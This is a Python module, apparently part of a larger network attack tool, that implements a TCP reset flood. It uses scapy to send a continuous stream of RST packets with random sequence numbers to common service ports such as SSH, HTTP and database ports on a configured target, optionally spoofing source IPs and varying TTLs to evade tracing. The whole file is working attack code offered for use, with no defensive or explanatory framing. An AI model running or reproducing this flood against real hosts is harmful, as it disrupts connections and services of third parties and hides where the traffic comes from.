import asyncio
import random
from scapy.all import IP, TCP, send
from src.attacks.base import AttackBase

class TcpReset(AttackBase):
    async def attack_loop(self):
        print("Starte TCP Reset Attacke...")
        from concurrent.futures import ThreadPoolExecutor
        loop = asyncio.get_event_loop()
        target_ports = [80, 443, 22, 21, 25, 110, 143, 3306, 5432, 27017]
        if self.config.port != 80:
            target_ports.append(self.config.port)
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            while not self.stop_event.is_set():
                dst_port = random.choice(target_ports)
                src_ip = self._get_random_ip() if self.config.use_ip_spoofing else None
                src_port = self._get_random_port()
                seq_num = random.randint(0, 2**32-1)
                ttl = self._get_random_ttl() if self.config.ttl_variation else None
                ip_params = {"dst": self.config.target}
                if src_ip:
                    ip_params["src"] = src_ip
                if ttl:
                    ip_params["ttl"] = ttl
                rst_packet = IP(**ip_params) / TCP(sport=src_port, dport=dst_port, flags="R", seq=seq_num)
                if self.task_queue:
                    await self.task_queue.put((
                        lambda pkt=rst_packet: send(pkt, verbose=False),
                        ()
                    ))
                else:
                    await loop.run_in_executor(
                        executor,
                        lambda pkt=rst_packet: send(pkt, verbose=False)
                    )
                self.stats.update_sent(1, 60)
                await asyncio.sleep(0.001)
